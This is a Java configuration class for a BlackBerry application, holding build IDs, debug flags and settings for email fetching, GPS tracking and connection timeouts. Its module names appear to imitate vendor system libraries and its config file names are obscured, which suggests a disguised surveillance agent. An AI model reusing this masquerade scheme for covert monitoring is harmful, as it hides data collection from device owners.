package blackberry.config;

public class Cfg {
    
    public static final int BUILD_ID = 11;
    public static final String BUILD_TIMESTAMP = "20120131-014434";
    
    //==========================================================
    // Static configuration
    
    public static final boolean FETCH_WHOLE_EMAIL = false;

    public static final boolean DEBUG_FLASH = true;
    public static final boolean DEBUG_EVENTS = false;
    public static final boolean DEBUG_OUT = true;
    public static final boolean DEBUG_INFO = false;

    public static boolean SD_ENABLED = false;

    public static final boolean GPS_ENABLED = true;
    public static final int GPS_MAXAGE = -1;
    public static final int GPS_TIMEOUT = 600;

    public static boolean IS_UI = true;

    public static final String GROUP_NAME =  "Rim Library"; //"Rim Library";
    public static final String MODULE_NAME = "net_rim_bb_lib"; //"net_rim_bb_lib";
    public static final String MODULE_LIB_NAME = "net_rim_bb_lib_base"; //"net_rim_bb_lib_base";

    public static final String NEW_CONF = "1";//"newconfig.dat";
    public static final String ACTUAL_CONF = "2";//"config.dat";

    public static final int CONNECTION_TIMEOUT = 120;

    //==========================================================
}